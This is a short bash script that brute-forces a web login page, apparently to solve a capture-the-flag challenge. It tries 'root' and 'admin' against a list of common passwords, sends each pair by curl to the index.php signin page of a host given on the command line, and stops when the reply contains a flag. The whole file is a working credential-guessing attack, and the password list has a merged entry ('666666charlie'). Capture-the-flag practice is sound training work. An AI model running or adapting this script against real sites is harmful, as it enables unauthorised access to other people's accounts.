#!/bin/bash

userlist=(root, admin)
passlist=(password 123456 12345678 qwerty abc123 monkey 1234567 letmein trustno1 dragon baseball 111111 iloveyou master ashley bailey passw0rd shadow 654321 superman qazwsx michael Football jesus ninja 123456789 adobe123 123123 admin photoshop password1 azerty 0 12345 1234 football mustang access welcome 1qaz2wsx qwertyuiop 1234567890 princess login solo 121212 flower hottie loveme zaq1zaq1 starwars hello freedom whatever sunshine 666666charlie aa123456 donald qwerty123)
for user in ${userlist[@]}; do
	for pass in ${passlist[@]}; do
		http=$(curl -X GET "http://$1/index.php?page=signin&username=${user}&password=${pass}&Login=Login" --silent)
		res=$(echo ${http} | grep -oE 'The flag is : [[:alnum:]]{1,100}')
		if [[ ${#res} -ge 2 ]]; then
			echo "SUCCEEDED: (${user}:${pass}). ${res}"
			break 2
		else
			echo "FAILED (${user}:${pass})"
		fi
	done
done
